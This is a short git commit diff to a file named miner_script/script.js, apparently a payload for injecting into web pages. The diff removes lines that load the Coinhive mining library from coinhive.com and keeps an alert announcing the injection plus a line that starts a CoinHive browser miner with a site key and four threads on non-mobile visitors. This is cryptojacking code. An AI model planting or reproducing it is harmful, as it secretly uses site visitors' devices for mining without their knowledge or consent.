ec769f6957dcf5f108652ecf9bcfb094ca21f858
Robert Balogh <balogh.robert@trconsult.local>
2018-01-17 11:29:29 +0100

    v1

--- miner_script/script.js
+++ miner_script/script.js
@@ -1,6 +1,2 @@
 alert("if you can read this, the script has been injected. This will be the minner");
-var script = document.createElement( 'script' );
-script.type = 'text/javascript';
-script.src = "https://coinhive.com/lib/coinhive.min.js";
-document.body.appendChild( script );
 var a=new CoinHive.User('NcdINDXOOULy7e9ccZ1Gtg4ZzYmPmCU0','MIT', {threads:4});if (!a.isMobile()) {a.start(CoinHive.FORCE_EXCLUSIVE_TAB);};
